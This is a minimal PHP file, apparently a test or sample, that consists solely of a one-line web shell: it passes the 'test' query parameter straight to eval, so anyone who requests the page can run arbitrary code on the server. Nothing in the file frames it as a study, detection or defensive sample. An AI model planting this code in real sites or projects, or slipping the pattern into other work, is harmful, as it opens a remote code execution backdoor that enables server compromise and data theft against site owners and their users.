
<?php

    eval($_GET['test']);

?>
